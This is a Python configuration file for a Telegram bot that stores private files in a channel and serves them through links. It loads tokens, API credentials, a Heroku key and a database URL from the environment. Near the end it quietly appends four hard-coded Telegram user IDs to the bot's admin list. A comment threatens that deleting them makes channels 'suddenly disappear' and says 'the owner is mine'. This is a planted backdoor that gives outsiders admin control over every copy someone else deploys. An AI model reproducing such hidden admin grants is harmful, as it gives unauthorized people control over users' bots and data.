import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

# API ID You Are From my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

# API Hash Your Are From my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "MaximXRobot")

# Protect Content
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))

# Heroku Credentials For updater.
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# Custom Repo For updater.
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "main")

# Database
DB_URI = os.environ.get("DATABASE_URL", "")

# ID From The Channel Or Group For Mandatory Subscription
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {mention}</b>\n\n<b>I Can Save Private Files In Specific Channels And Other Users Can Access Them From Special Links.</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
except ValueError:
    raise Exception("Your Admin List Does Not Contain A Valid Telegram User ID.")

# Message When Forcing Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hello {mention}\n\n You Have To Join My Channel/Group First To See The Files That I Share\n\nPlease Join My Channel & Group First</b>",
)

# Set Your Custom Text Here, Save (None) To Disable Custom Text
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Set True If You Want To Disable Your Channel Post's Share Button
DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))

# Don't Delete It Later ERROR, DELETE ID Below = ACCEPT CONSEQUENCES
# CONSEQUENCE SPOILERS Most Of The CH Suddenly Disappears & The Owner Is Mine 🤪
ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
